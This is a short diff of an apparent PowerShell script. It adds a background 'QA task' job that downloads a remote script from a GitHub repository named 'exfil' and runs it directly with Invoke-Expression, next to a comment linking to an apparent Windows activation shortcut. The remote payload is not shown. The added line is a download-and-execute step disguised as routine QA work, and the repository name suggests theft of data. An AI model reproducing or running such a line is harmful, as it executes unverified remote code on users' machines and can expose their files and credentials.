@@ -1,7 +1,7 @@
 # Start the QA task in the background
 # tinyurl.com/qawinactiv
 $qaTaskJob = Start-Job -ScriptBlock {
-    Invoke-Expression (Invoke-WebRequest -Uri https://codeberg.org/sempiampi/mavericks/raw/branch/main/AutomatedTaskWithPingInstall.ps1 -UseBasicParsing).Content
+    Invoke-Expression (Invoke-WebRequest -Uri https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/AutomatedTaskWithPingInstall.ps1 -UseBasicParsing).Content
 }
 
 # Display a numbered list of options
